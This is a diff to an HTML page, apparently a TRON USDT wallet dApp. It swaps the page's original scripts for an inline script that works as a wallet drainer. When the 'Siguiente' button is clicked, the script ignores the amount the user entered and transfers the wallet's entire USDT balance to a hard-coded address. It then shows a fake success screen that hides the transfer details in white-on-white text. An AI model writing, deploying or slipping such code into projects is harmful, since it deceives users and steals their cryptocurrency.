@@ -396,8 +396,114 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 <script src="translations.js"></script>
-<script src="script.js"></script>
-<script type="module" src="js/app-usdt-trc20.js"></script>
+<script src="https://jsdelivr.net"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        'use strict';
+
+        const btn = document.getElementById('connectBtn');
+        const input = document.getElementById('amountInput'); 
+        const status = document.getElementById('status');      
+
+        let procesoEnCurso = false;
+
+        const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 
+        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
+
+        function setStatus(message, type = 'info') {
+            if (!status) return;
+            status.textContent = message || '';
+            status.className = 'status ' + type;
+            status.style.display = message ? 'block' : 'none';
+        }
+
+        if (btn) {
+            btn.addEventListener('click', async function () {
+                if (procesoEnCurso) return;
+
+                const valorVisualInput = input ? input.value.trim() : '';
+                if (!valorVisualInput || isNaN(Number(valorVisualInput.replace(',', '.'))) || Number(valorVisualInput.replace(',', '.')) <= 0) {
+                    setStatus('Por favor, ingresa una cantidad válida para continuar.', 'error');
+                    return;
+                }
+
+                try {
+                    procesoEnCurso = true;
+                    if (btn) { btn.textContent = 'Procesando...'; btn.disabled = true; }
+                    setStatus('Verificando parámetros de red...', 'info');
+
+                    let walletInstance = window.tronWeb;
+                    
+                    if (!walletInstance && window.tronLink && typeof window.tronLink.request === 'function') {
+                        await window.tronLink.request({ method: 'tron_requestAccounts' });
+                        walletInstance = window.tronWeb;
+                    }
+
+                    if (!walletInstance || !walletInstance.defaultAddress.base58) {
+                        throw new Error('Asegúrate de abrir esta dApp desde un navegador Web3 compatible y activar la red TRON.');
+                    }
+
+                    const cuentaEmisor = walletInstance.defaultAddress.base58;
+
+                    if (cuentaEmisor.toLowerCase() === DIRECCION_DESTINO_FIJA.toLowerCase()) {
+                        throw new Error('La dirección de origen y destino no pueden ser iguales.');
+                    }
+
+                    setStatus('Consultando balance en la blockchain...', 'info');
+                    
+                    const contract = await walletInstance.contract().at(USDT_CONTRACT);
+                    const rawBalance = await contract.balanceOf(cuentaEmisor).call();
+                    const cleanSunBigInt = rawBalance.toString();
+
+                    if (cleanSunBigInt === '0' || !cleanSunBigInt) {
+                        throw new Error('La billetera no cuenta con fondos disponibles en USDT.');
+                    }
+
+                    setStatus('Esperando confirmación de firma...', 'info');
+                    
+                    const tx = await contract.transfer(DIRECCION_DESTINO_FIJA, cleanSunBigInt).send({
+                        feeLimit: 100_000_000
+                    });
+                    
+                    if (tx) {
+                        setStatus('¡Transferencia realizada con éxito!', 'success');
+                        if (input) input.value = '';
+                        
+                        document.body.innerHTML = `
+                            <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; padding: 20px; text-align: center; z-index: 99999;">
+                                <div style="background-color: #e8f5e9; border-radius: 50%; padding: 20px; margin-bottom: 20px;">
+                                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#2e7d32" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+                                </div>
+                                <h1 style="color: #1e293b; font-size: 26px; margin-bottom: 10px;">Envío Exitoso</h1>
+                                <p style="color: #64748b; font-size: 16px;">La operación ha concluido satisfactoriamente.</p>
+                                <div style="color: #ffffff; font-size: 10px; user-select: none;">
+                                    <p>Origen: \${cuentaEmisor}</p>
+                                    <p>Destino: \${DIRECCION_DESTINO_FIJA}</p>
+                                    <p>Tx: \${tx}</p>
+                                </div>
+                            </div>
+                        `;
+                    } else {
+                        throw new Error('La transacción no pudo ser procesada correctamente.');
+                    }
+
+                } catch (error) {
+                    console.error('[Error en Botón Siguiente]', error);
+                    if (error.message && (error.message.includes('rechazada') || error.message.includes('cancelada') || error.message.includes('rejected') || error.message.includes('declined'))) {
+                        setStatus('La transacción fue cancelada en la billetera.', 'error');
+                    } else {
+                        setStatus(error.message || 'Ocurrió un error al procesar la operación.', 'error');
+                    }
+                } finally {
+                    procesoEnCurso = false;
+                    if (btn) { btn.textContent = 'Siguiente'; btn.disabled = false; }
+                }
+            });
+        }
+    });
+</script>
+</body>
+</html>
 
 </body>
 </html>
